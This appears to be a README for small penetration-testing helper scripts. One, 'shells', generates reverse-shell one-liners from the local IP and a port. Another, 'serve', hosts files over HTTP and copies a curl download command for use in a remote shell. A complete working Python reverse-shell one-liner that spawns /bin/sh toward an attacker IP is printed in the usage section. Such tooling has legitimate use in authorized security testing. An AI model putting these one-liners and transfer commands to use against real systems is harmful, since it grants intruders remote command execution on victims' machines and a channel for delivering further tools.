# Installation
Make the install script executable and run it.
```console
$ chmod +x install
$ ./install
```

### Requirements
`xsel` for automatic copying to clipboard.

`python` 2 or 3. Installation for python is not handled by the install script.

# shells
Grabs your IPv4 from the specified device and inserts the IP and specified port into various reverse shell oneliners

Disclaimer: Currently only tested on a Kali distribution. Should work on any Debian-based distribution.

### Usage
```console
$ shells
shells - Grabs device IP and outputs a reverse shell.
Usage: shells {bash|python|php|ruby|nc|all} [PORT]
$ shells python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("example_ip",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

# serve
Easily create a simple http server and copy a string into your clipboard for fast file transfer

### Usage

```console
$ serve
String 'curl -O http://192.168.xxx.xxx:8000/' has been copied to clipboard
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
# or
$ serve DEVICE_NAME
```
Now on the remote shell simply hit paste and type the filename you'd like to transfer
